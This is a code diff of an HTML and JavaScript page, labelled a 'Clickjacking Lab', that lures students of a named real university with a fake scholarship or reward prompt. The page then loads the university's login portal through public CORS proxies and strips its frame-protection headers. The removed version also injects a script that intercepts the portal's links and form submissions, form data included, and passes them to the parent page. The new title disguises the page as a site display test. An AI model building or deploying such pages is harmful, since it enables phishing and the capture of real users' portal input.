@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Clickjacking Professional Lab - اختبار متقدم</title>
+    <title>إختبار ظهور موقع الجامعة</title>
     <style>
         * {
             margin: 0;
@@ -20,47 +20,37 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         }
 
-        /* الحاوية الرئيسية */
-        #main-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 1;
-        }
-
-        /* واجهة الخداع (Decoy UI) */
         #decoy-ui {
             position: absolute;
             width: 100%;
             height: 100%;
-            background: linear-gradient(to bottom, rgba(255,255,255,0.95), rgba(245,245,245,0.95));
+            background: white;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             z-index: 10;
             pointer-events: auto;
-            backdrop-filter: blur(2px);
+            transition: opacity 0.5s ease-out;
         }
 
-        /* صندوق المحتوى */
-        .content-box {
+        #decoy-ui.hidden {
+            opacity: 0;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .gift-box {
             text-align: center;
             background: white;
             padding: 60px 50px;
             border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            max-width: 500px;
-            animation: slideUp 0.8s ease-out;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+            max-width: 450px;
+            animation: slideIn 0.8s ease-out;
         }
 
-        @keyframes slideUp {
+        @keyframes slideIn {
             from {
                 opacity: 0;
                 transform: translateY(30px);
@@ -71,51 +61,49 @@
             }
         }
 
-        /* العنوان الرئيسي */
-        .content-box h1 {
+        .gift-box h1 {
             color: #28a745;
             font-size: 32px;
-            margin-bottom: 15px;
-            font-weight: 700;
-            letter-spacing: 1px;
+            margin: 20px 0;
+            font-weight: 800;
         }
 
-        /* الوصف */
-        .content-box p {
-            color: #555;
-            font-size: 18px;
-            margin-bottom: 30px;
+        .gift-box p {
+            color: #666;
+            font-size: 16px;
+            margin: 15px 0 30px 0;
             line-height: 1.6;
-            font-weight: 500;
         }
 
-        /* الزر الرئيسي */
-        .action-button {
-            background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
+        .gift-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            padding: 18px 60px;
+            padding: 16px 50px;
             border: none;
             border-radius: 50px;
             font-size: 18px;
-            font-weight: 600;
+            font-weight: bold;
+            margin-top: 30px;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
             cursor: pointer;
-            box-shadow: 0 8px 25px rgba(0, 123, 255, 0.4);
             transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-top: 20px;
+            letter-spacing: 0.5px;
         }
 
-        .action-button:hover {
+        .gift-btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 12px 35px rgba(0, 123, 255, 0.6);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.4);
         }
 
-        .action-button:active {
+        .gift-btn:active {
             transform: translateY(-1px);
         }
 
-        /* الإطار المستهدف (iframe) */
+        .gift-btn.loading {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
         #target-frame {
             position: absolute;
             top: 0;
@@ -124,11 +112,17 @@
             height: 100%;
             border: none;
             z-index: 5;
-            opacity: 0.001;
+            opacity: 0;
             pointer-events: none;
+            transition: opacity 0.5s ease-out;
         }
 
-        /* مؤشر التحميل */
+        #target-frame.visible {
+            opacity: 1;
+            pointer-events: auto;
+            z-index: 15;
+        }
+
         .loading-indicator {
             display: none;
             position: fixed;
@@ -136,15 +130,23 @@
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 100;
+            text-align: center;
         }
 
         .spinner {
             width: 50px;
             height: 50px;
-            border: 5px solid rgba(255, 255, 255, 0.3);
-            border-top: 5px solid white;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid white;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 1.2s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
         }
 
         @keyframes spin {
@@ -156,260 +158,223 @@
             display: block;
         }
 
-        /* شريط المعلومات */
-        .info-bar {
+        .info-panel {
             position: fixed;
             bottom: 20px;
             right: 20px;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 12px 20px;
+            background: rgba(0, 0, 0, 0.9);
+            color: #00ff00;
+            padding: 15px 20px;
             border-radius: 8px;
             font-size: 12px;
             z-index: 999;
             font-family: 'Courier New', monospace;
-            max-width: 300px;
+            max-width: 350px;
             display: none;
+            border: 1px solid #00ff00;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
         }
 
-        .info-bar.active {
+        .info-panel.active {
             display: block;
         }
 
-        /* الشارة */
-        .badge {
-            display: inline-block;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-top: 15px;
-            font-weight: 600;
+        .info-line {
+            margin: 5px 0;
+            display: flex;
+            justify-content: space-between;
         }
 
-        /* استجابة الشاشات الصغيرة */
+        .info-label {
+            color: #00ff00;
+            font-weight: bold;
+        }
+
+        .info-value {
+            color: #ffff00;
+        }
+
         @media (max-width: 768px) {
-            .content-box {
-                padding: 40px 30px;
+            .gift-box {
+                padding: 40px 25px;
                 margin: 20px;
             }
 
-            .content-box h1 {
+            .gift-box h1 {
                 font-size: 24px;
             }
 
-            .content-box p {
-                font-size: 16px;
-            }
-
-            .action-button {
-                padding: 15px 40px;
+            .gift-btn {
+                padding: 14px 40px;
                 font-size: 16px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- الحاوية الرئيسية -->
-    <div id="main-container">
-        <!-- واجهة الخداع -->
-        <div id="decoy-ui">
-            <div class="content-box">
-                <h1>🎁 مبروك! جائزة خاصة</h1>
-                <p>أنت مرشح للحصول على منحة دراسية مجانية من جامعة العلوم والتكنولوجيا</p>
-                <button class="action-button" id="main-button">استلم المنحة الآن</button>
-                <div class="badge">✓ معتمد من الجامعة</div>
-            </div>
-        </div>
-
-        <!-- مؤشر التحميل -->
-        <div class="loading-indicator" id="loading">
-            <div class="spinner"></div>
-        </div>
-
-        <!-- شريط المعلومات -->
-        <div class="info-bar" id="info-bar">
-            <span id="status-text">جاري التحميل...</span>
+    <div id="decoy-ui">
+        <div class="gift-box">
+            <h1>🎁 مبروك! مكافأة الطالب المتميز</h1>
+            <p>اضغط أدناه لتنشيط حسابك واستلام الجائزة</p>
+            <button class="gift-btn" id="main-button">تنشيط الحساب واستلام الجائزة</button>
         </div>
     </div>
 
-    <!-- الإطار المستهدف -->
-    <iframe id="target-frame"></iframe>
+    <div class="loading-indicator" id="loading">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loading-text">جاري التحميل...</div>
+    </div>
 
-    <!-- مكتبة x-frame-bypass -->
-    <script type="module">
-        import {xFrameBypass} from 'https://unpkg.com/x-frame-bypass@1.0.2/x-frame-bypass.js';
-        customElements.define('x-frame-bypass', xFrameBypass, {extends: 'iframe'});
-    </script>
+    <div class="info-panel" id="info-panel">
+        <div class="info-line">
+            <span class="info-label">الحالة:</span>
+            <span class="info-value" id="status-value">جاهز</span>
+        </div>
+        <div class="info-line">
+            <span class="info-label">البروكسي:</span>
+            <span class="info-value" id="proxy-value">-</span>
+        </div>
+        <div class="info-line">
+            <span class="info-label">الوقت:</span>
+            <span class="info-value" id="time-value">-</span>
+        </div>
+    </div>
 
-    <!-- سكريبت التطبيق الرئيسي -->
+    <iframe id="target-frame" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"></iframe>
+
     <script>
-        // إعدادات التطبيق
         const CONFIG = {
             targetUrl: 'https://portal.ust.edu.ye',
             proxies: [
-                'https://api.allorigins.win/get?url=',
-                'https://api.codetabs.com/v1/proxy/?quest=',
-                'https://cors-anywhere.herokuapp.com/'
+                { name: 'AllOrigins', url: 'https://api.allorigins.win/get?url=' },
+                { name: 'CodeTabs', url: 'https://api.codetabs.com/v1/proxy/?quest=' },
+                { name: 'CORS Anywhere', url: 'https://cors-anywhere.herokuapp.com/' }
             ],
-            debugMode: false
+            debugMode: false,
+            maxRetries: 3,
+            timeout: 30000
         };
 
-        // عناصر DOM
         const elements = {
             decoyUI: document.getElementById('decoy-ui'),
             targetFrame: document.getElementById('target-frame'),
             mainButton: document.getElementById('main-button'),
             loading: document.getElementById('loading'),
-            infoBar: document.getElementById('info-bar'),
-            statusText: document.getElementById('status-text')
+            loadingText: document.getElementById('loading-text'),
+            infoPanel: document.getElementById('info-panel'),
+            statusValue: document.getElementById('status-value'),
+            proxyValue: document.getElementById('proxy-value'),
+            timeValue: document.getElementById('time-value')
         };
 
-        /**
-         * دالة تحديث حالة التطبيق
-         * @param {string} status - حالة التطبيق
-         * @param {boolean} showLoading - إظهار مؤشر التحميل
-         */
-        function updateStatus(status, showLoading = false) {
+        const state = {
+            isLoading: false,
+            currentProxyIndex: 0,
+            startTime: null,
+            retryCount: 0
+        };
+
+        function updateStatus(status, details = {}) {
             if (CONFIG.debugMode) {
-                elements.infoBar.classList.add('active');
-                elements.statusText.textContent = status;
+                elements.infoPanel.classList.add('active');
+                elements.statusValue.textContent = status;
+                if (details.proxy) elements.proxyValue.textContent = details.proxy;
+                if (details.time) elements.timeValue.textContent = details.time + 'ms';
             }
-            if (showLoading) {
-                elements.loading.classList.add('active');
-            } else {
-                elements.loading.classList.remove('active');
-            }
-            console.log('[Clickjacking Lab]', status);
+            console.log('[Lab]', status, details);
         }
 
-        /**
-         * دالة تحميل المحتوى عبر البروكسي
-         * @param {string} url - الرابط المراد تحميله
-         * @param {number} proxyIndex - فهرس البروكسي
-         */
-        async function loadContentViaProxy(url, proxyIndex = 0) {
-            try {
-                updateStatus(`جاري التحميل من البروكسي ${proxyIndex + 1}...`, true);
-
-                const proxyUrl = CONFIG.proxies[proxyIndex] + encodeURIComponent(url);
-                const response = await fetch(proxyUrl, {
-                    method: 'GET',
-                    headers: {
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
-                    }
-                });
-
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-                }
-
-                let html = await response.text();
-
-                // معالجة المحتوى
-                html = processContent(html, url);
-
-                // تحميل المحتوى في iframe
-                elements.targetFrame.srcdoc = html;
-
-                updateStatus('تم التحميل بنجاح!', false);
-                
-                // إخفاء واجهة الخداع بعد التحميل
-                setTimeout(() => {
-                    elements.decoyUI.style.opacity = '0';
-                    elements.decoyUI.style.pointerEvents = 'none';
-                }, 500);
-
-            } catch (error) {
-                console.error('[Error]', error);
-                updateStatus(`خطأ: ${error.message}`, false);
-
-                // محاولة البروكسي التالي
-                if (proxyIndex < CONFIG.proxies.length - 1) {
-                    setTimeout(() => {
-                        loadContentViaProxy(url, proxyIndex + 1);
-                    }, 1000);
-                } else {
-                    updateStatus('فشل التحميل من جميع البروكسيات', false);
-                    showErrorMessage('عذراً، لم نتمكن من تحميل المحتوى. يرجى المحاولة لاحقاً.');
-                }
-            }
-        }
-
-        /**
-         * دالة معالجة المحتوى
-         * @param {string} html - محتوى HTML
-         * @param {string} baseUrl - الرابط الأساسي
-         * @returns {string} محتوى معالج
-         */
-        function processContent(html, baseUrl) {
-            // إضافة base tag للحفاظ على الروابط النسبية
-            const baseTag = `<base href="${baseUrl}">`;
+        function loadContentViaProxy(url) {
+            if (state.isLoading) return;
             
-            // إضافة سكريبت للتعامل مع الملاحة
-            const navigationScript = `
-                <script>
-                    // معالج النقر على الروابط
-                    document.addEventListener('click', function(e) {
-                        const link = e.target.closest('a');
-                        if (link && link.href) {
-                            e.preventDefault();
-                            // إرسال رسالة للنافذة الأب
-                            window.parent.postMessage({
-                                type: 'navigate',
-                                url: link.href
-                            }, '*');
-                        }
-                    });
-
-                    // معالج إرسال النماذج
-                    document.addEventListener('submit', function(e) {
-                        const form = e.target;
-                        if (form && form.action) {
-                            e.preventDefault();
-                            const formData = new FormData(form);
-                            const params = new URLSearchParams(formData);
-                            const actionUrl = form.method.toLowerCase() === 'post' 
-                                ? form.action 
-                                : form.action + '?' + params.toString();
-                            
-                            window.parent.postMessage({
-                                type: 'navigate',
-                                url: actionUrl,
-                                method: form.method
-                            }, '*');
-                        }
-                    });
-                </script>
-            `;
-
-            // معالجة HTML
-            let processedHtml = html;
-
-            // إزالة رؤوس الحماية
-            processedHtml = processedHtml.replace(/X-Frame-Options/gi, 'X-Frame-Options-Disabled');
-            processedHtml = processedHtml.replace(/Content-Security-Policy/gi, 'CSP-Disabled');
-
-            // إضافة base tag
-            if (processedHtml.includes('<head')) {
-                processedHtml = processedHtml.replace(/<head([^>]*)>/i, `<head$1>\n${baseTag}\n`);
-            } else {
-                processedHtml = `<head>${baseTag}</head>${processedHtml}`;
-            }
-
-            // إضافة سكريبت الملاحة
-            if (processedHtml.includes('</head>')) {
-                processedHtml = processedHtml.replace('</head>', `${navigationScript}</head>`);
-            }
-
-            return processedHtml;
+            state.isLoading = true;
+            state.startTime = Date.now();
+            elements.loading.classList.add('active');
+            elements.mainButton.classList.add('loading');
+            elements.mainButton.disabled = true;
+            
+            updateStatus('جاري التحميل...', { proxy: CONFIG.proxies[state.currentProxyIndex].name });
+            
+            const proxy = CONFIG.proxies[state.currentProxyIndex];
+            const proxyUrl = proxy.url + encodeURIComponent(url);
+            
+            fetch(proxyUrl, {
+                method: 'GET',
+                headers: {
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+                },
+                timeout: CONFIG.timeout
+            })
+            .then(response => {
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return response.text();
+            })
+            .then(html => {
+                const loadTime = Date.now() - state.startTime;
+                updateStatus('تم التحميل بنجاح', { proxy: proxy.name, time: loadTime });
+                
+                processAndDisplayContent(html, url);
+                
+                setTimeout(() => {
+                    elements.decoyUI.classList.add('hidden');
+                    elements.targetFrame.classList.add('visible');
+                }, 300);
+                
+                state.isLoading = false;
+                elements.loading.classList.remove('active');
+                elements.mainButton.classList.remove('loading');
+                elements.mainButton.disabled = false;
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                updateStatus('خطأ في التحميل', { proxy: proxy.name });
+                
+                state.retryCount++;
+                state.currentProxyIndex++;
+                
+                if (state.currentProxyIndex < CONFIG.proxies.length && state.retryCount < CONFIG.maxRetries) {
+                    console.log(`Trying proxy: ${CONFIG.proxies[state.currentProxyIndex].name}`);
+                    elements.loadingText.textContent = `محاولة البروكسي ${state.currentProxyIndex + 1}...`;
+                    setTimeout(() => loadContentViaProxy(url), 1000);
+                } else {
+                    showErrorMessage('عذراً، لم نتمكن من تحميل الموقع.');
+                    state.isLoading = false;
+                    elements.loading.classList.remove('active');
+                    elements.mainButton.classList.remove('loading');
+                    elements.mainButton.disabled = false;
+                }
+            });
         }
 
-        /**
-         * دالة عرض رسالة خطأ
-         * @param {string} message - الرسالة
-         */
+        function processAndDisplayContent(html, baseUrl) {
+            try {
+                const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
+                const blobUrl = URL.createObjectURL(blob);
+                elements.targetFrame.src = blobUrl;
+                console.log('✅ Content loaded in iframe');
+            } catch (error) {
+                console.error('Error:', error);
+                try {
+                    let processedHtml = html;
+                    processedHtml = processedHtml.replace(/X-Frame-Options/gi, 'X-Frame-Options-Disabled');
+                    processedHtml = processedHtml.replace(/Content-Security-Policy/gi, 'CSP-Disabled');
+                    
+                    const baseTag = `<base href="${baseUrl}">`;
+                    if (processedHtml.includes('</head>')) {
+                        processedHtml = processedHtml.replace('</head>', `${baseTag}</head>`);
+                    } else {
+                        processedHtml = `<head>${baseTag}</head>${processedHtml}`;
+                    }
+                    
+                    elements.targetFrame.srcdoc = processedHtml;
+                    console.log('✅ Content loaded using srcdoc');
+                } catch (fallbackError) {
+                    console.error('Fallback error:', fallbackError);
+                    showErrorMessage('حدث خطأ في معالجة المحتوى.');
+                }
+            }
+        }
+
         function showErrorMessage(message) {
             const errorDiv = document.createElement('div');
             errorDiv.style.cssText = `
@@ -417,52 +382,47 @@
                 top: 50%;
                 left: 50%;
                 transform: translate(-50%, -50%);
-                background: #f8d7da;
+                background: linear-gradient(135deg, #f8d7da, #f5c6cb);
                 color: #721c24;
-                padding: 20px;
-                border-radius: 8px;
-                border: 1px solid #f5c6cb;
+                padding: 30px;
+                border-radius: 12px;
+                border: 2px solid #f5c6cb;
                 z-index: 1000;
                 max-width: 400px;
                 text-align: center;
                 font-size: 16px;
+                font-weight: 600;
+                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
             `;
             errorDiv.textContent = message;
             document.body.appendChild(errorDiv);
+            
+            setTimeout(() => errorDiv.remove(), 5000);
         }
 
-        /**
-         * معالج الرسائل من iframe
-         */
-        window.addEventListener('message', function(event) {
-            if (event.data && event.data.type === 'navigate') {
-                console.log('Navigating to:', event.data.url);
-                loadContentViaProxy(event.data.url);
+        elements.mainButton.addEventListener('click', function() {
+            if (!state.isLoading) {
+                console.log('🚀 Button clicked - Starting load');
+                state.retryCount = 0;
+                state.currentProxyIndex = 0;
+                loadContentViaProxy(CONFIG.targetUrl);
             }
         });
 
-        /**
-         * معالج النقر على الزر الرئيسي
-         */
-        elements.mainButton.addEventListener('click', function() {
-            console.log('Button clicked - Starting to load content');
-            loadContentViaProxy(CONFIG.targetUrl);
-        });
-
-        /**
-         * تفعيل وضع التصحيح عند الضغط على F12
-         */
         document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                 CONFIG.debugMode = !CONFIG.debugMode;
-                console.log('Debug mode:', CONFIG.debugMode ? 'ON' : 'OFF');
+                console.log('Debug mode:', CONFIG.debugMode ? 'ON ✅' : 'OFF ❌');
+                if (!CONFIG.debugMode) {
+                    elements.infoPanel.classList.remove('active');
+                }
             }
         });
 
-        // تهيئة التطبيق
-        console.log('Clickjacking Professional Lab - Initialized');
-        console.log('Target URL:', CONFIG.targetUrl);
-        console.log('Available Proxies:', CONFIG.proxies.length);
+        console.log('🚀 Clickjacking Lab - Initialized');
+        console.log('📍 Target URL:', CONFIG.targetUrl);
+        console.log('🔗 Available Proxies:', CONFIG.proxies.length);
+        console.log('💡 Press F12 to enable debug mode');
     </script>
 </body>
 </html>
